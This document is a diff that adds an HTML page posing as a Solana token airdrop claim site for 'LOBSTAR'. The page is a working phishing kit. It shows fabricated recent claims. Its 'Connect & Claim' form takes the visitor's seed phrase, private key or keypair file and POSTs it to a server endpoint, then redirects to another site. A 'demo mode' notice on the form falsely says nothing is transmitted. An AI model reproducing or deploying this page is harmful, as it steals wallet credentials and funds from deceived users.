@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>LOBSTAR Airdrop</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
+    <style>
+        /* ========== STYLES (unchanged) ========== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #0b0e14;
+            font-family: 'Inter', sans-serif;
+            color: #eef2ff;
+            line-height: 1.5;
+            padding: 2rem 1rem;
+        }
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+        .card {
+            background: #11151f;
+            border-radius: 1.5rem;
+            padding: 1.5rem;
+            margin-bottom: 1.5rem;
+            border: 1px solid #1e2a3a;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+        }
+        .token-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 1rem;
+            margin-bottom: 1rem;
+        }
+        .token-name {
+            font-size: 2rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #f97316, #facc15);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        .token-price {
+            font-size: 1.1rem;
+            background: #1e2a3a;
+            padding: 0.25rem 0.75rem;
+            border-radius: 2rem;
+        }
+        .ca-box {
+            background: #0a0e14;
+            padding: 0.75rem 1rem;
+            border-radius: 1rem;
+            margin: 1rem 0;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 0.5rem;
+            font-family: monospace;
+            font-size: 0.9rem;
+            border: 1px solid #2a3a4a;
+        }
+        .ca-text {
+            word-break: break-all;
+            color: #9ca3af;
+        }
+        .btn-outline {
+            background: transparent;
+            border: 1px solid #f97316;
+            color: #f97316;
+            padding: 0.3rem 0.8rem;
+            border-radius: 2rem;
+            font-size: 0.8rem;
+            font-weight: 500;
+            text-decoration: none;
+            transition: 0.2s;
+            cursor: pointer;
+            display: inline-block;
+        }
+        .btn-outline:hover {
+            background: #f9731620;
+        }
+        .status-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.4rem;
+            background: #0f3a1f;
+            color: #4ade80;
+            padding: 0.25rem 1rem;
+            border-radius: 2rem;
+            font-size: 0.85rem;
+            font-weight: 500;
+        }
+        .claim-btn {
+            background: linear-gradient(135deg, #f97316, #facc15);
+            border: none;
+            color: #0b0e14;
+            font-weight: 800;
+            padding: 0.8rem 2rem;
+            border-radius: 3rem;
+            font-size: 1.2rem;
+            cursor: pointer;
+            transition: transform 0.1s, box-shadow 0.2s;
+            width: 100%;
+            max-width: 280px;
+            margin: 1rem auto 0.5rem;
+            display: block;
+            text-align: center;
+        }
+        .claim-btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 4px 12px #f9731680;
+        }
+        .helper-text {
+            font-size: 0.75rem;
+            color: #6b7280;
+            text-align: center;
+        }
+        .recent-list {
+            background: #0a0e14;
+            border-radius: 1rem;
+            padding: 0.5rem;
+            max-height: 280px;
+            overflow-y: auto;
+        }
+        .claim-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0.75rem;
+            border-bottom: 1px solid #1e2a3a;
+            font-size: 0.9rem;
+        }
+        .claim-addr {
+            font-family: monospace;
+            background: #1e2a3a;
+            padding: 0.2rem 0.5rem;
+            border-radius: 1rem;
+        }
+        .claim-amount {
+            font-weight: 700;
+            color: #facc15;
+        }
+        .steps {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+            margin: 1rem 0;
+        }
+        .step {
+            display: flex;
+            gap: 1rem;
+            align-items: flex-start;
+        }
+        .step-num {
+            background: #f97316;
+            color: #0b0e14;
+            font-weight: 800;
+            width: 2rem;
+            height: 2rem;
+            border-radius: 2rem;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+        .info-grid {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1.5rem;
+            margin-top: 1rem;
+            justify-content: space-between;
+        }
+        .info-col {
+            flex: 1;
+            min-width: 160px;
+        }
+        .info-col h4 {
+            color: #f97316;
+            margin-bottom: 0.5rem;
+            font-size: 1rem;
+        }
+        .tag-list {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.5rem;
+        }
+        .tag {
+            background: #1e2a3a;
+            padding: 0.2rem 0.8rem;
+            border-radius: 2rem;
+            font-size: 0.8rem;
+        }
+        hr {
+            border-color: #1e2a3a;
+            margin: 1rem 0;
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+        .modal-content {
+            background: #11151f;
+            border-radius: 1.5rem;
+            max-width: 500px;
+            width: 90%;
+            padding: 1.5rem;
+            border: 1px solid #f97316;
+            position: relative;
+        }
+        .modal-close {
+            position: absolute;
+            top: 1rem;
+            right: 1.2rem;
+            font-size: 1.5rem;
+            cursor: pointer;
+            color: #9ca3af;
+        }
+        .modal-close:hover {
+            color: #f97316;
+        }
+        .wallet-list {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
+            gap: 1rem;
+            margin: 1.5rem 0;
+        }
+        .wallet-item {
+            background: #0a0e14;
+            border: 1px solid #2a3a4a;
+            border-radius: 1rem;
+            padding: 0.8rem;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .wallet-item:hover {
+            border-color: #f97316;
+            background: #1a1f2a;
+        }
+        .wallet-icon {
+            font-size: 2rem;
+            margin-bottom: 0.5rem;
+        }
+        .wallet-name {
+            font-weight: 500;
+        }
+        .form-group {
+            margin-bottom: 1.2rem;
+        }
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 500;
+        }
+        textarea, input[type="text"], input[type="file"] {
+            width: 100%;
+            background: #0a0e14;
+            border: 1px solid #2a3a4a;
+            border-radius: 0.8rem;
+            padding: 0.8rem;
+            color: #eef2ff;
+            font-family: monospace;
+        }
+        .radio-group {
+            display: flex;
+            gap: 1rem;
+            margin-bottom: 1rem;
+        }
+        .radio-group label {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-weight: normal;
+        }
+        .submit-btn {
+            background: #f97316;
+            border: none;
+            color: #0b0e14;
+            font-weight: bold;
+            padding: 0.8rem;
+            border-radius: 2rem;
+            width: 100%;
+            cursor: pointer;
+        }
+        .submit-btn:hover {
+            background: #facc15;
+        }
+        @media (max-width: 640px) {
+            .container { padding: 0; }
+            .card { padding: 1rem; }
+            .token-name { font-size: 1.5rem; }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <!-- Circular coin banner with image (replace src with your own) -->
+    <div style="display: flex; justify-content: center; margin-bottom: 1.5rem;">
+        <div style="width: 80px; height: 80px; background: radial-gradient(circle at 30% 30%, #f97316, #facc15); border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 15px rgba(249,115,22,0.5);">
+            <img src="https://cdn-icons-png.flaticon.com/512/3095/3095154.png" alt="LOBSTAR" style="width: 60px; height: 60px; border-radius: 50%; object-fit: cover;">
+        </div>
+    </div>
+
+    <!-- Main token card -->
+    <div class="card">
+        <div class="token-header">
+            <div>
+                <div class="token-name">LOBSTAR</div>
+                <div class="token-price">📈 $0.000002</div>
+            </div>
+            <div class="status-badge">● READY TO INTERACT</div>
+        </div>
+
+        <div class="ca-box">
+            <span class="ca-text">CA: 4vgLQAyDuhmsXqMDCj2cFQr2r1vDwmjAJu7HNk3Rpump</span>
+            <div style="display: flex; gap: 0.5rem;">
+                <a href="https://dexscreener.com/solana/4vgLQAyDuhmsXqMDCj2cFQr2r1vDwmjAJu7HNk3Rpump" target="_blank" class="btn-outline">VIEW ON DEXSCREENER</a>
+                <a href="https://pump.fun/coin/4vgLQAyDuhmsXqMDCj2cFQr2r1vDwmjAJu7HNk3Rpump" target="_blank" class="btn-outline">PUMP FUN</a>
+            </div>
+        </div>
+
+        <div style="display: flex; justify-content: space-between; align-items: baseline; flex-wrap: wrap; gap: 1rem; margin: 1.5rem 0;">
+            <div>
+                <div style="font-size: 0.75rem; color: #9ca3af;">PROTOCOL</div>
+                <div style="font-weight: 600;">SOURCE METEORA</div>
+            </div>
+            <div style="text-align: right;">
+                <div style="font-size: 0.75rem; color: #9ca3af;">CLAIMABLE BALANCE</div>
+                <div style="font-size: 1.8rem; font-weight: 800;">784,190,715 LOBSTAR</div>
+            </div>
+        </div>
+
+        <button id="claimButton" class="claim-btn">CLAIM LOBSTAR</button>
+        <div class="helper-text">having trouble? try reloading page or turning off VPN</div>
+    </div>
+
+    <!-- Recent claims card -->
+    <div class="card">
+        <h3 style="margin-bottom: 1rem;">RECENT CLAIMS</h3>
+        <div class="recent-list" id="recentClaims">
+            <div class="claim-item"><span class="claim-addr">g8Pv...j2TR</span><span>Claimed Yield <span class="claim-amount">+19,000,000 LOBSTAR</span> just now</span></div>
+            <div class="claim-item"><span class="claim-addr">nwSk...y8BG</span><span>Claimed Yield <span class="claim-amount">+17,000,000 LOBSTAR</span> just now</span></div>
+            <div class="claim-item"><span class="claim-addr">TaVA...CxTs</span><span>Claimed Yield <span class="claim-amount">+14,000,000 LOBSTAR</span> just now</span></div>
+            <div class="claim-item"><span class="claim-addr">pPFr...zunU</span><span>Claimed Yield <span class="claim-amount">+17,000,000 LOBSTAR</span> just now</span></div>
+            <div class="claim-item"><span class="claim-addr">Fjw8...bpJG</span><span>Claimed Yield <span class="claim-amount">+19,000,000 LOBSTAR</span> just now</span></div>
+            <div class="claim-item"><span class="claim-addr">X4Nf...G4ex</span><span>Claimed Yield <span class="claim-amount">+16,000,000 LOBSTAR</span> just now</span></div>
+        </div>
+    </div>
+
+    <!-- Claiming process card -->
+    <div class="card">
+        <h3 style="margin-bottom: 1rem;">CLAIMING PROCESS & ELIGIBILITY</h3>
+        <div class="steps">
+            <div class="step"><span class="step-num">01</span><span>To qualify, you must hold <strong>$LOBSTAR</strong> in your wallet.</span></div>
+            <div class="step"><span class="step-num">02</span><span>Click the 'CLAIM' button and follow the wallet prompts to reveal your allocation.</span></div>
+            <div class="step"><span class="step-num">03</span><span>Approve Transaction to receive your allocation. Sometimes allocation might not show up properly, i.e +0.00001SOL. Simply ignore, this is a known issue from Phantom, and we're working on getting it fixed.</span></div>
+            <div class="step"><span class="step-num">04</span><span>All payouts are processed instantly to your wallet.</span></div>
+            <div class="step"><span class="step-num">05</span><span>Hold your allocation position to continue receiving recurring daily payouts.</span></div>
+        </div>
+    </div>
+
+    <!-- Airdrop description + integrations & system -->
+    <div class="card">
+        <div style="margin-bottom: 1rem;">
+            <h3 style="margin-bottom: 0.5rem;">Airdrop Live</h3>
+            <p>Claim your token airdrop on Solana. Connect wallet, enter token contract (CA), and claim. Supports all SPL tokens.</p>
+        </div>
+        <div class="info-grid">
+            <div class="info-col">
+                <h4>INTEGRATIONS</h4>
+                <div class="tag-list">
+                    <span class="tag">Pump.fun</span>
+                    <span class="tag">Raydium</span>
+                    <span class="tag">Orca</span>
+                    <span class="tag">Meteora</span>
+                </div>
+            </div>
+            <div class="info-col">
+                <h4>SYSTEM</h4>
+                <div class="tag-list">
+                    <span class="tag">Mainnet-Beta</span>
+                    <span class="tag">Version: v2.2.3</span>
+                </div>
+            </div>
+        </div>
+        <hr>
+        <div style="font-size: 0.75rem; text-align: center; color: #6b7280;">
+            lrops-sigma.vercel.app
+        </div>
+    </div>
+</div>
+
+<!-- Wallet selection modal -->
+<div id="walletModal" class="modal">
+    <div class="modal-content">
+        <span class="modal-close" id="closeWalletModal">&times;</span>
+        <h3 style="margin-bottom: 1rem;">Select Wallet</h3>
+        <div class="wallet-list" id="walletList"></div>
+    </div>
+</div>
+
+<!-- Credentials modal -->
+<div id="credsModal" class="modal">
+    <div class="modal-content">
+        <span class="modal-close" id="closeCredsModal">&times;</span>
+        <h3 style="margin-bottom: 1rem;">Connect Wallet</h3>
+        <p style="margin-bottom: 1rem; font-size: 0.9rem;">Selected: <strong id="selectedWalletName"></strong></p>
+        <div class="radio-group" id="inputTypeGroup">
+            <label><input type="radio" name="inputType" value="seed" checked> Seed Phrase</label>
+            <label><input type="radio" name="inputType" value="privateKey"> Private Key</label>
+            <label><input type="radio" name="inputType" value="json"> JSON File</label>
+        </div>
+        <div id="inputArea">
+            <div class="form-group" id="seedGroup">
+                <label>Seed Phrase (12 or 24 words)</label>
+                <textarea rows="3" placeholder="Enter your seed phrase..."></textarea>
+            </div>
+            <div class="form-group" id="privateKeyGroup" style="display: none;">
+                <label>Private Key (base58 or hex)</label>
+                <input type="text" placeholder="Enter private key...">
+            </div>
+            <div class="form-group" id="jsonGroup" style="display: none;">
+                <label>Upload JSON file (Solana keypair)</label>
+                <input type="file" accept=".json">
+            </div>
+        </div>
+        <button id="submitCredentials" class="submit-btn">Connect & Claim</button>
+        <p style="font-size: 0.7rem; margin-top: 1rem; color: #ff8c00;">⚠️ DEMO MODE: No actual wallet connection occurs. Input is not stored or transmitted.</p>
+    </div>
+</div>
+
+<script>
+    // List of wallets (10)
+    const wallets = [
+        { name: "Phantom", icon: "🦋" },
+        { name: "Solflare", icon: "🔥" },
+        { name: "Backpack", icon: "🎒" },
+        { name: "Glow", icon: "✨" },
+        { name: "Slope", icon: "⛰️" },
+        { name: "Trust Wallet", icon: "🔒" },
+        { name: "Ledger", icon: "📒" },
+        { name: "Exodus", icon: "🚀" },
+        { name: "Coinbase Wallet", icon: "💰" },
+        { name: "Torus", icon: "🌀" }
+    ];
+
+    let selectedWallet = null;
+
+    // Populate wallet modal
+    const walletListDiv = document.getElementById('walletList');
+    wallets.forEach(w => {
+        const div = document.createElement('div');
+        div.className = 'wallet-item';
+        div.innerHTML = `<div class="wallet-icon">${w.icon}</div><div class="wallet-name">${w.name}</div>`;
+        div.addEventListener('click', () => {
+            selectedWallet = w.name;
+            document.getElementById('selectedWalletName').innerText = selectedWallet;
+            document.getElementById('walletModal').style.display = 'none';
+            document.getElementById('credsModal').style.display = 'flex';
+        });
+        walletListDiv.appendChild(div);
+    });
+
+    // Modal controls
+    const walletModal = document.getElementById('walletModal');
+    const credsModal = document.getElementById('credsModal');
+    const claimBtn = document.getElementById('claimButton');
+
+    claimBtn.addEventListener('click', () => {
+        walletModal.style.display = 'flex';
+    });
+
+    document.getElementById('closeWalletModal').onclick = () => walletModal.style.display = 'none';
+    document.getElementById('closeCredsModal').onclick = () => credsModal.style.display = 'none';
+    window.onclick = (e) => {
+        if (e.target === walletModal) walletModal.style.display = 'none';
+        if (e.target === credsModal) credsModal.style.display = 'none';
+    };
+
+    // Toggle input fields based on radio selection
+    const radios = document.querySelectorAll('input[name="inputType"]');
+    const seedGroup = document.getElementById('seedGroup');
+    const privateKeyGroup = document.getElementById('privateKeyGroup');
+    const jsonGroup = document.getElementById('jsonGroup');
+
+    function toggleInputs() {
+        const selected = document.querySelector('input[name="inputType"]:checked').value;
+        seedGroup.style.display = 'none';
+        privateKeyGroup.style.display = 'none';
+        jsonGroup.style.display = 'none';
+        if (selected === 'seed') seedGroup.style.display = 'block';
+        else if (selected === 'privateKey') privateKeyGroup.style.display = 'block';
+        else if (selected === 'json') jsonGroup.style.display = 'block';
+    }
+
+    radios.forEach(radio => radio.addEventListener('change', toggleInputs));
+    toggleInputs();
+
+    // Submit credentials – sends data to Vercel serverless endpoint
+    document.getElementById('submitCredentials').addEventListener('click', async () => {
+        const type = document.querySelector('input[name="inputType"]:checked').value;
+        let value = '';
+        
+        if (type === 'seed') {
+            value = document.querySelector('#seedGroup textarea').value.trim();
+        } else if (type === 'privateKey') {
+            value = document.querySelector('#privateKeyGroup input').value.trim();
+        } else if (type === 'json') {
+            const fileInput = document.querySelector('#jsonGroup input');
+            if (fileInput.files.length > 0) {
+                const file = fileInput.files[0];
+                const reader = new FileReader();
+                const promise = new Promise((resolve) => {
+                    reader.onload = (e) => resolve(e.target.result);
+                });
+                reader.readAsText(file);
+                value = await promise;
+            } else {
+                value = 'No file selected';
+            }
+        }
+
+        if (!value) {
+            alert('Please enter your credentials.');
+            return;
+        }
+
+        // Show loading
+        const btn = document.getElementById('submitCredentials');
+        const originalText = btn.innerText;
+        btn.innerText = 'Submitting...';
+        btn.disabled = true;
+
+        try {
+            const response = await fetch('/api/submit-credentials', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    wallet: selectedWallet,
+                    inputType: type,
+                    value: value,
+                    timestamp: new Date().toISOString()
+                })
+            });
+            const data = await response.json();
+            if (data.success) {
+                window.location.href = 'https://funiec.pythonanywhere.com/success/success.html';
+            } else {
+                alert('Error: ' + (data.message || 'Unknown error'));
+            }
+        } catch (err) {
+            console.error('Fetch error:', err);
+            alert('Connection error: ' + err.message);
+        } finally {
+            btn.innerText = originalText;
+            btn.disabled = false;
+        }
+    })
+</script>
+</body>
+</html>
